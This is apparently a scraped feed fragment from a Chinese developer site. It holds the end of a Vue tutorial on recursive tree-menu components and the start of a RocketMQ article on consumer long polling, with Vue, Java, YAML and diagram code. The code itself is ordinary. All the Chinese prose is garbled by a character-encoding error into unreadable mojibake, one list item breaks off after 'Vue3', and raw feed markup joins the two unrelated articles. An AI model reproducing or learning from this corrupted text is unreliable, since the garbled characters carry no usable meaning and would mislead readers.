<h4 data-id="heading-8">3. ä½¿ç”¨é€’å½’ç»„ä»¶</h4>
<p>ä½¿ç”¨æ–¹å¼å’Œæ™®é€šç»„ä»¶å®Œå…¨ä¸€è‡´ï¼Œåªéœ€ä¼ é€’æœ€å¤–å±‚æ•°æ®å³å¯ï¼Œç»„ä»¶ä¼šè‡ªåŠ¨é€’å½’æ¸²æŸ“æ‰€æœ‰å±‚çº§ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æ ‘å½¢èœå•ï¼ˆé€’å½’ç»„ä»¶å®ç°ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">TreeMenu</span> <span class="hljs-attr">:menu-data</span>=<span class="hljs-string">"treeData"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">TreeMenu</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./components/TreeMenu.vue"</span>;
<span class="hljs-comment">// å¯¼å…¥æ¨¡æ‹Ÿçš„æ ‘å½¢æ•°æ®</span>
<span class="hljs-keyword">const</span> treeData = [<span class="hljs-comment">/* ä¸Šæ–‡å®šä¹‰çš„æ ‘å½¢æ•°æ® */</span>];
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-9">å››ã€å…³é”®ç»†èŠ‚ï¼šå¿…çœ‹çš„3ä¸ªä¼˜åŒ–ç‚¹ï¼ˆé¿å…è¸©å‘ï¼‰</h3>
<h4 data-id="heading-10">1. å¿…é¡»åŠ ã€Œé€’å½’ç»ˆæ­¢æ¡ä»¶ã€ï¼ˆé‡ä¸­ä¹‹é‡ï¼‰</h4>
<p>å‘ç‚¹ï¼šå¦‚æœå¿˜è®°åŠ v-ifåˆ¤æ–­ï¼Œç»„ä»¶ä¼šæ— é™è°ƒç”¨è‡ªèº«ï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€é¡µé¢å´©æºƒï¼Œæ§åˆ¶å°ä¼šæŠ¥â€œMaximum call stack size exceededâ€é”™è¯¯ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šå›ºå®šå†™æ³•â€”â€”v-if="item.children &amp;&amp; item.children.length"ï¼Œåªæœ‰å­˜åœ¨å­èŠ‚ç‚¹æ—¶æ‰é€’å½’ï¼Œæ— å­å¥³èŠ‚ç‚¹åˆ™ç»ˆæ­¢ã€‚</p>
<h4 data-id="heading-11">2. æ•°æ®ä¼ é€’è¦â€œç²¾å‡†â€ï¼ˆåªä¼ å½“å‰å±‚çº§æ•°æ®ï¼‰</h4>
<p>é€’å½’æ—¶ï¼Œçˆ¶ç»„ä»¶ç»™å­ç»„ä»¶ä¼ é€’çš„å¿…é¡»æ˜¯ã€Œå½“å‰èŠ‚ç‚¹çš„childrenã€ï¼ˆ:menu-data="item.children"ï¼‰ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ ‘å½¢æ•°æ®ï¼Œå¦åˆ™ä¼šé‡å¤æ¸²æŸ“æ‰€æœ‰å±‚çº§ï¼Œå¯¼è‡´æ•°æ®é”™ä¹±ã€‚</p>
<h4 data-id="heading-12">3. æ ·å¼éš”ç¦»ï¼ˆé¿å…å±‚çº§æ ·å¼æ··ä¹±ï¼‰</h4>
<p>é€’å½’ç»„ä»¶ä¼šæ¸²æŸ“å¤šä¸ªå±‚çº§ï¼Œæ ·å¼å®¹æ˜“ç»§æ‰¿æ··ä¹±ï¼ˆæ¯”å¦‚æ‰€æœ‰liæ ‡ç­¾æ ·å¼ä¸€è‡´ï¼Œæ— æ³•åŒºåˆ†å±‚çº§ï¼‰ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šé€šè¿‡åµŒå¥—æ ·å¼ç»™ä¸åŒå±‚çº§æ·»åŠ åŒºåˆ†ï¼ˆæ¯”å¦‚å­å±‚çº§ç¼©è¿›ï¼‰ï¼Œç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">&lt;style scoped&gt;
.<span class="hljs-property">tree</span>-menu {
  margin-<span class="hljs-attr">left</span>: 20px; <span class="hljs-comment">/* å­å±‚çº§ç¼©è¿›ï¼ŒåŒºåˆ†å±‚çº§ */</span>
}
.<span class="hljs-property">tree</span>-item {
  <span class="hljs-attr">margin</span>: 5px <span class="hljs-number">0</span>;
  list-<span class="hljs-attr">style</span>: none;
}
.<span class="hljs-property">tree</span>-item span {
  <span class="hljs-attr">cursor</span>: pointer;
}
.<span class="hljs-property">tree</span>-item <span class="hljs-attr">span</span>:hover {
  <span class="hljs-attr">color</span>: #42b983;
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-13">äº”ã€æ‰©å±•åœºæ™¯ï¼šé€’å½’ç»„ä»¶çš„å¸¸è§ç”¨æ³•å»¶ä¼¸</h3>
<p>é™¤äº†æ ‘å½¢èœå•ï¼Œname+templateé€’å½’è¿˜èƒ½é€‚é…ä»¥ä¸‹é«˜é¢‘åœºæ™¯ï¼Œæ ¸å¿ƒé€»è¾‘å®Œå…¨ä¸€è‡´ï¼Œåªéœ€ä¿®æ”¹æ¸²æŸ“å†…å®¹å³å¯ï¼š</p>
<h4 data-id="heading-14">1. åµŒå¥—è¯„è®ºï¼ˆå¤šå±‚è¯„è®ºå›å¤ï¼‰</h4>
<p>æ•°æ®ç»“æ„ä¸­ï¼Œæ¯æ¡è¯„è®ºåŒ…å«idã€contentã€replyï¼ˆå­è¯„è®ºæ•°ç»„ï¼‰ï¼Œé€’å½’æ¸²æŸ“replyæ•°ç»„ï¼Œç»ˆæ­¢æ¡ä»¶ï¼šreplyä¸ºç©ºæ—¶åœæ­¢ã€‚</p>
<h4 data-id="heading-15">2. æ–‡ä»¶å¤¹å¯¼èˆªï¼ˆå¤šå±‚æ–‡ä»¶å¤¹åµŒå¥—ï¼‰</h4>
<p>æ•°æ®ç»“æ„åŒ…å«folderNameã€isFolderã€childrenï¼ˆå­æ–‡ä»¶å¤¹ï¼‰ï¼Œé€’å½’æ¸²æŸ“childrenï¼Œå¯æ·»åŠ å±•å¼€/æŠ˜å é€»è¾‘ï¼ˆv-showæ§åˆ¶å­å±‚çº§æ˜¾ç¤ºéšè—ï¼‰ã€‚</p>
<h4 data-id="heading-16">3. åˆ†ç±»åˆ—è¡¨ï¼ˆå¤šçº§å•†å“åˆ†ç±»ï¼‰</h4>
<p>å’Œæ ‘å½¢èœå•é€»è¾‘ä¸€è‡´ï¼Œå¯æ·»åŠ é€‰ä¸­çŠ¶æ€ã€è·³è½¬é“¾æ¥ï¼Œé€‚é…ç”µå•†å¹³å°çš„å¤šçº§åˆ†ç±»å¯¼èˆªã€‚</p>
<h3 data-id="heading-17">å…­ã€æ€»ç»“ï¼šname + templateé€’å½’æ ¸å¿ƒè¦ç‚¹ï¼ˆæ–°æ‰‹å¿…èƒŒï¼‰</h3>
<ol>
<li>æ ¸å¿ƒå†™æ³•ï¼šç»„ä»¶å®šä¹‰nameå±æ€§ â†’ templateä¸­é€šè¿‡nameè‡ªè°ƒç”¨ â†’ åŠ ç»ˆæ­¢æ¡ä»¶ï¼ˆchildrenä¸ºç©ºåœæ­¢ï¼‰ï¼›</li>
<li>Vue3 
</li><li>å…³é”®é¿å‘ï¼šå¿…é¡»åŠ ç»ˆæ­¢æ¡ä»¶ã€ç²¾å‡†ä¼ é€’å½“å‰å±‚çº§æ•°æ®ã€åšå¥½æ ·å¼éš”ç¦»ï¼›</li>
<li>é€‚ç”¨åœºæ™¯ï¼šæ‰€æœ‰å±‚çº§ä¸å›ºå®šçš„ç»“æ„æ¸²æŸ“ï¼ˆæ ‘å½¢ã€åµŒå¥—è¯„è®ºã€å¤šçº§åˆ†ç±»ç­‰ï¼‰ã€‚</li>
</ol>
<p>å…¶å®Vueé€’å½’ç»„ä»¶ä¸€ç‚¹éƒ½ä¸å¤æ‚ï¼Œname+templateå†™æ³•æ›´æ˜¯å…¥é—¨çº§éš¾åº¦ï¼Œè®°ä½â€œè‡ªå¼•ç”¨+ç»ˆæ­¢æ¡ä»¶â€ä¸¤ä¸ªæ ¸å¿ƒï¼Œå°±èƒ½è½»æ¾åº”å¯¹æ‰€æœ‰å±‚çº§æ¸²æŸ“éœ€æ±‚ã€‚ç»ƒä¼šè¿™ä¸ªæ¡ˆä¾‹ï¼Œä¸ç®¡æ˜¯å®é™…å¼€å‘è¿˜æ˜¯é¢è¯•ï¼Œéƒ½èƒ½è½»æ¾æ‹¿æï½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥å‰–æRocketMQçš„æ¶ˆè´¹é€»è¾‘]]></title>    <link>https://juejin.cn/post/7602497125268897798</link>    <guid>https://juejin.cn/post/7602497125268897798</guid>    <pubDate>2026-02-04T02:57:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602497125268897798" data-draft-id="7602529888483311679" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥å‰–æRocketMQçš„æ¶ˆè´¹é€»è¾‘"/> <meta itemprop="keywords" content="åç«¯,RocketMQ"/> <meta itemprop="datePublished" content="2026-02-04T02:57:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥å‰–æRocketMQçš„æ¶ˆè´¹é€»è¾‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:57:19.000Z" title="Wed Feb 04 2026 02:57:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å¾ˆå¤šäººåœ¨ä½¿ç”¨RocketMQæ—¶ï¼ŒåªçŸ¥é“å†™ä¸ªListenerå°±èƒ½æ¶ˆè´¹æ¶ˆæ¯ï¼Œä½†å¯¹åº•å±‚çš„æ¶ˆè´¹æœºåˆ¶ä¸€çŸ¥åŠè§£ã€‚æœ¬æ–‡å°†ç”¨å¤§ç™½è¯æ·±å…¥å‰–æRocketMQçš„æ¶ˆè´¹é€»è¾‘ï¼Œå¸®åŠ©ä½ çœŸæ­£ç†è§£ï¼šæ¶ˆæ¯æ˜¯æ€ä¹ˆåˆ°è¾¾ä½ çš„ä»£ç çš„ï¼Ÿæ¨æ¨¡å¼è¿˜æ˜¯æ‹‰æ¨¡å¼ï¼Ÿçº¿ç¨‹æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿ</p>
<p>æœ¬æ–‡ä»¥Spring Boot Starteræ–¹å¼ä¸ºä¾‹è¿›è¡Œè®²è§£ï¼Œè¿™ä¹Ÿæ˜¯ç›®å‰æœ€å¸¸ç”¨çš„æ–¹å¼ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€æ•´ä½“æ¶ˆè´¹æµç¨‹æ¦‚è§ˆ</h2>
<p>å…ˆä»å®è§‚å±‚é¢çœ‹çœ‹RocketMQçš„æ¶ˆè´¹æµç¨‹ã€‚æ•´ä¸ªè¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªæ ¸å¿ƒç¯èŠ‚ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[Brokerå­˜å‚¨æ¶ˆæ¯] --&gt;|é•¿è½®è¯¢æ‹‰å–| B[Consumeræ‹‰å–çº¿ç¨‹]
    B --&gt;|æ”¾å…¥æœ¬åœ°ç¼“å­˜| C[ProcessQueue]
    C --&gt;|åˆ†å‘æ¶ˆæ¯| D[æ¶ˆè´¹çº¿ç¨‹æ± ]
    D --&gt;|å›è°ƒ| E[ä½ çš„ä¸šåŠ¡ä»£ç ]
    E --&gt;|è¿”å›ç»“æœ| F[ACK/NACK]
    
    style A fill:#e1f5ff,stroke:#01579b,stroke-width:2px
    style B fill:#fff3e0,stroke:#e65100,stroke-width:2px
    style C fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    style D fill:#e8f5e9,stroke:#1b5e20,stroke-width:2px
    style E fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    style F fill:#fce4ec,stroke:#880e4f,stroke-width:2px
</code></pre>
<p>è¿™ä¸ªæµç¨‹çœ‹èµ·æ¥ç®€å•ï¼Œä½†æ¯ä¸€æ­¥éƒ½æœ‰å¾ˆå¤šç»†èŠ‚å€¼å¾—æ·±ç©¶ã€‚</p>
<h2 data-id="heading-2">äºŒã€æ¨æ¨¡å¼ vs æ‹‰æ¨¡å¼ï¼šä¸€ä¸ªç¾ä¸½çš„è¯¯è§£</h2>
<h3 data-id="heading-3">2.1 è¡¨é¢ç°è±¡ï¼šçœ‹èµ·æ¥æ˜¯æ¨æ¨¡å¼</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RocketMQMessageListener(topic = "order-topic", consumerGroup = "order-group")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RocketMQListener</span>&lt;Order&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMessage</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-comment">// æ¶ˆæ¯è‡ªåŠ¨"æ¨é€"åˆ°è¿™é‡Œ</span>
        System.out.println(<span class="hljs-string">"æ”¶åˆ°è®¢å•: "</span> + order);
    }
}
</code></pre>
<p>çœ‹èµ·æ¥æ¶ˆæ¯æ˜¯è¢«"æ¨é€"è¿‡æ¥çš„å¯¹å§ï¼Ÿä½ ä»€ä¹ˆéƒ½ä¸ç”¨åšï¼Œæ¶ˆæ¯å°±è‡ªåŠ¨åˆ°è¾¾äº†ä½ çš„æ–¹æ³•ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆRocketMQçš„Consumerå«åš <code>PushConsumer</code>ã€‚</p>
<h3 data-id="heading-4">2.2 åº•å±‚çœŸç›¸ï¼šæœ¬è´¨æ˜¯æ‹‰æ¨¡å¼</h3>
<p>ä½†å®é™…ä¸Šï¼ŒRocketMQçš„åº•å±‚å®ç°æ˜¯<strong>æ‹‰æ¨¡å¼</strong>ã€‚Consumerå¹¶ä¸æ˜¯è¢«åŠ¨ç­‰å¾…ï¼Œè€Œæ˜¯ä¸»åŠ¨å»Brokeræ‹‰å–æ¶ˆæ¯ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant C as Consumer
    participant B as Broker
    
    rect rgb(230, 245, 255)
    Note over C,B: æ‹‰æ¨¡å¼çš„çœŸå®æµç¨‹
    C-&gt;&gt;B: å‘èµ·æ‹‰å–è¯·æ±‚
    B--&gt;&gt;C: æ²¡æœ‰æ–°æ¶ˆæ¯ï¼Œç­‰å¾…...
    Note over B: BrokeræŒ‚èµ·è¯·æ±‚æœ€å¤š30ç§’
    B-&gt;&gt;B: æœ‰æ–°æ¶ˆæ¯åˆ°è¾¾
    B--&gt;&gt;C: ç«‹å³è¿”å›æ¶ˆæ¯
    C-&gt;&gt;C: å¤„ç†æ¶ˆæ¯
    C-&gt;&gt;B: ç«‹å³å‘èµ·ä¸‹ä¸€æ¬¡æ‹‰å–
    end
</code></pre>
<h3 data-id="heading-5">2.3 ä¸ºä»€ä¹ˆè¦è¿™æ ·è®¾è®¡ï¼Ÿ</h3>
<p>RocketMQæŠŠæ‹‰å–é€»è¾‘å°è£…åœ¨SDKé‡Œï¼Œå¯¹å¤–æš´éœ²æˆæ¨æ¨¡å¼çš„æ¥å£ï¼Œç›®çš„æ˜¯ï¼š</p>
<ol>
<li><strong>ç®€åŒ–å¼€å‘</strong>ï¼šå¼€å‘è€…åªéœ€å†™Listenerï¼Œæ— éœ€å…³å¿ƒæ‹‰å–é€»è¾‘</li>
<li><strong>æµé‡æ§åˆ¶</strong>ï¼šConsumerå¯ä»¥æ§åˆ¶æ‹‰å–é€Ÿåº¦ï¼Œé¿å…è¢«å‹å®</li>
<li><strong>å®æ—¶æ€§å¥½</strong>ï¼šé•¿è½®è¯¢æœºåˆ¶ä¿è¯æ¶ˆæ¯åŠæ—¶é€è¾¾</li>
</ol>
<p><strong>å…³é”®ç†è§£ï¼š</strong></p>
<ul>
<li><strong>æ¨æ¨¡å¼ï¼ˆè¡¨è±¡ï¼‰</strong>ï¼šå¼€å‘è€…æ— éœ€å…³å¿ƒæ‹‰å–ï¼Œä¸“æ³¨ä¸šåŠ¡é€»è¾‘</li>
<li><strong>æ‹‰æ¨¡å¼ï¼ˆæœ¬è´¨ï¼‰</strong>ï¼šConsumerä¸»åŠ¨æ§åˆ¶æ‹‰å–é€Ÿåº¦</li>
<li><strong>é•¿è½®è¯¢ï¼ˆå®ç°ï¼‰</strong>ï¼šå…¼é¡¾å®æ—¶æ€§å’Œæ€§èƒ½</li>
</ul>
<h2 data-id="heading-6">ä¸‰ã€é•¿è½®è¯¢ï¼šæ¨æ‹‰æ¨¡å¼çš„å®Œç¾ç»“åˆ</h2>
<h3 data-id="heading-7">3.1 ä»€ä¹ˆæ˜¯é•¿è½®è¯¢</h3>
<p>é•¿è½®è¯¢ï¼ˆLong Pollingï¼‰æ˜¯RocketMQå®ç°"ç±»æ¨æ¨¡å¼"çš„æ ¸å¿ƒæŠ€æœ¯ã€‚å®ƒè§£å†³äº†ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>å¦‚ä½•åšåˆ°å®æ—¶æ€§é«˜ï¼ˆåƒæ¨æ¨¡å¼ï¼‰</li>
<li>å¦‚ä½•é¿å…é¢‘ç¹ç©ºè½®è¯¢æµªè´¹èµ„æºï¼ˆåƒæ‹‰æ¨¡å¼ï¼‰</li>
</ul>
<h3 data-id="heading-8">3.2 é•¿è½®è¯¢çš„å·¥ä½œæµç¨‹</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant C as Consumer
    participant B as Broker
    participant S as Storage
    
    rect rgb(255, 243, 224)
    Note over C,B: åœºæ™¯1: æœ‰æ¶ˆæ¯
    C-&gt;&gt;B: æ‹‰å–è¯·æ±‚(timeout=30s)
    B-&gt;&gt;S: æŸ¥è¯¢æ–°æ¶ˆæ¯
    S--&gt;&gt;B: æœ‰3æ¡æ¶ˆæ¯
    B--&gt;&gt;C: ç«‹å³è¿”å›(è€—æ—¶&lt;5ms)
    end
    
    rect rgb(232, 245, 233)
    Note over C,B: åœºæ™¯2: æš‚æ— æ¶ˆæ¯
    C-&gt;&gt;B: æ‹‰å–è¯·æ±‚(timeout=30s)
    B-&gt;&gt;S: æŸ¥è¯¢æ–°æ¶ˆæ¯
    S--&gt;&gt;B: æš‚æ— æ¶ˆæ¯
    Note over B: æŒ‚èµ·è¯·æ±‚ï¼Œç­‰å¾…æœ€å¤š30ç§’
    S-&gt;&gt;B: æ–°æ¶ˆæ¯åˆ°è¾¾
    B--&gt;&gt;C: ç«‹å³è¿”å›æ¶ˆæ¯
    end
</code></pre>
<h3 data-id="heading-9">3.3 é•¿è½®è¯¢çš„ä¼˜åŠ¿</h3>





























<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>çŸ­è½®è¯¢</th><th>é•¿è½®è¯¢</th><th>çœŸæ¨é€</th></tr></thead><tbody><tr><td><strong>å®æ—¶æ€§</strong></td><td>å·®</td><td>å¥½</td><td>æœ€å¥½</td></tr><tr><td><strong>æœåŠ¡å™¨å‹åŠ›</strong></td><td>å¤§</td><td>å°</td><td>å°</td></tr><tr><td><strong>Consumeræ§åˆ¶åŠ›</strong></td><td>é«˜</td><td>é«˜</td><td>ä½</td></tr></tbody></table>
<p><strong>RocketMQé€‰æ‹©é•¿è½®è¯¢çš„åŸå› ï¼š</strong></p>
<ol>
<li>å…¼é¡¾å®æ—¶æ€§ï¼šæ–°æ¶ˆæ¯åˆ°è¾¾æ—¶ç«‹å³è¿”å›</li>
<li>é™ä½å‹åŠ›ï¼šé¿å…é¢‘ç¹çš„ç©ºè½®è¯¢</li>
<li>Consumerå¯æ§ï¼šæ§åˆ¶æ‹‰å–é€Ÿåº¦ï¼Œä¸ä¼šè¢«å‹å®</li>
<li>å®ç°ç®€å•ï¼šæ¯”ç»´æŠ¤é•¿è¿æ¥ç®€å•</li>
</ol>
<h3 data-id="heading-10">3.4 é…ç½®å‚æ•°</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">rocketmq:</span>
  <span class="hljs-attr">consumer:</span>
    <span class="hljs-attr">pull-timeout:</span> <span class="hljs-number">30000</span>        <span class="hljs-comment"># é•¿è½®è¯¢è¶…æ—¶30ç§’(æ¨èé»˜è®¤å€¼)</span>
    <span class="hljs-attr">pull-interval:</span> <span class="hljs-number">0</span>           <span class="hljs-comment"># æ‹‰å–é—´éš”0æ¯«ç§’(ç«‹å³æ‹‰å–)</span>
    <span class="hljs-attr">pull-batch-size:</span> <span class="hljs-number">32</span>        <span class="hljs-comment"># æ¯æ¬¡æ‹‰å–32æ¡æ¶ˆæ¯</span>
</code></pre>
<h2 data-id="heading-11">å››ã€é˜Ÿåˆ—åˆ†é…æœºåˆ¶ï¼šConsumerå¦‚ä½•ç“œåˆ†é˜Ÿåˆ—</h2>
<h3 data-id="heading-12">4.1 é˜Ÿåˆ—åˆ†é…åŸç†</h3>
<p>å‡è®¾ä¸€ä¸ªTopicæœ‰8ä¸ªé˜Ÿåˆ—ï¼Œ2ä¸ªConsumerï¼Œå®ƒä»¬æ˜¯æ€ä¹ˆåˆ†é…çš„ï¼Ÿ</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph Topic: order-topic
    Q1[Queue-0]
    Q2[Queue-1]
    Q3[Queue-2]
    Q4[Queue-3]
    Q5[Queue-4]
    Q6[Queue-5]
    Q7[Queue-6]
    Q8[Queue-7]
    end
    
    subgraph Consumer Group
    C1[Consumer-1&lt;br/&gt;Pod-1]
    C2[Consumer-2&lt;br/&gt;Pod-2]
    end
    
    Q1 &amp; Q2 &amp; Q3 &amp; Q4 --&gt; C1
    Q5 &amp; Q6 &amp; Q7 &amp; Q8 --&gt; C2
    
    style Q1 fill:#e1f5ff,stroke:#01579b
    style Q2 fill:#e1f5ff,stroke:#01579b
    style Q3 fill:#e1f5ff,stroke:#01579b
    style Q4 fill:#e1f5ff,stroke:#01579b
    style Q5 fill:#fff3e0,stroke:#e65100
    style Q6 fill:#fff3e0,stroke:#e65100
    style Q7 fill:#fff3e0,stroke:#e65100
    style Q8 fill:#fff3e0,stroke:#e65100
    style C1 fill:#e1f5ff,stroke:#01579b,stroke-width:3px
    style C2 fill:#fff3e0,stroke:#e65100,stroke-width:3px
</code></pre>
<p><strong>åˆ†é…ç­–ç•¥ï¼šå¹³å‡åˆ†é…ï¼ˆé»˜è®¤ï¼‰</strong></p>
